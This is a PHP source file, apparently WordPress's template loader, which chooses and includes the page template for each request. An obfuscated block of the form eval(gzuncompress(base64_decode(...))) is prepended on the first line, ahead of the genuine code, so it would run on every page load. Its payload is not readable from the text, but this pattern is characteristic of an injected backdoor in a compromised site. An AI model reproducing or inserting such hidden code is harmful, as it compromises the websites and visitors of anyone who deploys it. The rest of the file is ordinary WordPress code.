<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Loads the correct template based on the visitor's url
 * @package WordPress
 */
if ( defined('WP_USE_THEMES') && WP_USE_THEMES )
	/**
	 * Fires before determining which template to load.
	 *
	 * @since 1.5.0
	 */
	do_action( 'template_redirect' );

/**
 * Filters whether to allow 'HEAD' requests to generate content.
 *
 * Provides a significant performance bump by exiting before the page
 * content loads for 'HEAD' requests. See #14348.
 *
 * @since 3.5.0
 *
 * @param bool $exit Whether to exit without generating any content for 'HEAD' requests. Default true.
 */
if ( 'HEAD' === $_SERVER['REQUEST_METHOD'] && apply_filters( 'exit_on_http_head', true ) )
	exit();

// Process feeds and trackbacks even if not using themes.
if ( is_robots() ) :
	/**
	 * Fired when the template loader determines a robots.txt request.
	 *
	 * @since 2.1.0
	 */
	do_action( 'do_robots' );
	return;
elseif ( is_feed() ) :
	do_feed();
	return;
elseif ( is_trackback() ) :
	include( ABSPATH . 'wp-trackback.php' );
	return;
endif;

if ( defined('WP_USE_THEMES') && WP_USE_THEMES ) :
	$template = false;
	if     ( is_embed()          && $template = get_embed_template()          ) :
	elseif ( is_404()            && $template = get_404_template()            ) :
	elseif ( is_search()         && $template = get_search_template()         ) :
	elseif ( is_front_page()     && $template = get_front_page_template()     ) :
	elseif ( is_home()           && $template = get_home_template()           ) :
	elseif ( is_post_type_archive() && $template = get_post_type_archive_template() ) :
	elseif ( is_tax()            && $template = get_taxonomy_template()       ) :
	elseif ( is_attachment()     && $template = get_attachment_template()     ) :
		remove_filter('the_content', 'prepend_attachment');
	elseif ( is_single()         && $template = get_single_template()         ) :
	elseif ( is_page()           && $template = get_page_template()           ) :
	elseif ( is_singular()       && $template = get_singular_template()       ) :
	elseif ( is_category()       && $template = get_category_template()       ) :
	elseif ( is_tag()            && $template = get_tag_template()            ) :
	elseif ( is_author()         && $template = get_author_template()         ) :
	elseif ( is_date()           && $template = get_date_template()           ) :
	elseif ( is_archive()        && $template = get_archive_template()        ) :
	else :
		$template = get_index_template();
	endif;
	/**
	 * Filters the path of the current template before including it.
	 *
	 * @since 3.0.0
	 *
	 * @param string $template The path of the template to include.
	 */
	if ( $template = apply_filters( 'template_include', $template ) ) {
		include( $template );
	} elseif ( current_user_can( 'switch_themes' ) ) {
		$theme = wp_get_theme();
		if ( $theme->errors() ) {
			wp_die( $theme->errors() );
		}
	}
	return;
endif;
